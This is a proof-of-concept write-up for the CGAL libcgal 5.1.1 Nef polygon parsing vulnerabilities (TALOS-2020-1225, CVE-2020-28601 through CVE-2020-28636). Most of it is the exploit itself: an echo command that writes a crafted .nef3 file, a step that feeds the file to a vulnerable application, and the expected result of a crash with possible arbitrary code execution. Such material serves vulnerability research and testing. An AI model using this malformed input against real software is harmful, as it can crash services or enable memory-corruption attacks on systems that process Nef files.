# CGAL libcgal Nef Polygon Parsing Vulnerabilities (TALOS-2020-1225)

## POC URL
https://talosintelligence.com/vulnerability_reports/TALOS-2020-1225

## Compilation Environment
- CGAL libcgal version 5.1.1
- Any system that processes Nef polygon files (.nef3) using vulnerable CGAL versions

## Run Command
1. Save the proof-of-concept exploit file:
```
echo 'Selective Nef Complex\n8\n42\n18\n2\n84\n2\n30\n0 { 0 2, 0 5, 0 1, -2 | 0 0 5 1 } 1\n1 { 3 5, 6 11, 2 3, -2 | 5 0 5 1 } 1\n2 { 6 8, 12 17, 4 5, -2 | 5 5 5 1 } 1\n3 { 9 11, 18 23, 6 7, -2 | 0 5 0 1 } 1\n4 { 12 14, 24 29, 8 9, -2 | 5 0 0 1 } 1\n5 { 15 17, 30 35, 10 11, -2 | 5 5 0 1 } 1\n6 { 18 20, 36 41, 12 13, -2 | 0 5 5 1 } 1\n7 { 21 23, 42 47, 14 15, -2 | 0 0 3 1 } 0\n0 { 3, 0, 0 0 | 1 0 0 1 } 1\n1 { 18, 0, 0 5 | 0 1 0 1 } 1\n2 { 21, 0, 0 4 | 0 0 -1 1 } 1\n3 { 0, 1, 0 6 | -1 0 0 1 } 1\n4 { 6, 1, 0 7 | 0 1 0 1 } 1\n5 { 13, 1, 0 10 | 0 0 -1 1 } 1\n40 { 28, 13, 0 82 | 1 0 0 1 } 0\n41 { 30, 13, 0 79 | 0 0 -1 1 } 0' > exploit.nef3
```

2. Process the malicious file with a vulnerable CGAL application:
```
your_vulnerable_app exploit.nef3
```

## Expected Output
The vulnerable application should crash due to out-of-bounds read or type confusion vulnerabilities when processing the malformed Nef polygon file. This could potentially lead to arbitrary code execution depending on the application's memory layout and security mitigations.

## Vulnerabilities
This proof-of-concept demonstrates multiple out-of-bounds read vulnerabilities (CVE-2020-28601 through CVE-2020-28636) in CGAL's Nef polygon parsing functionality. The malformed file triggers improper validation of array indexes when processing polygon data structures.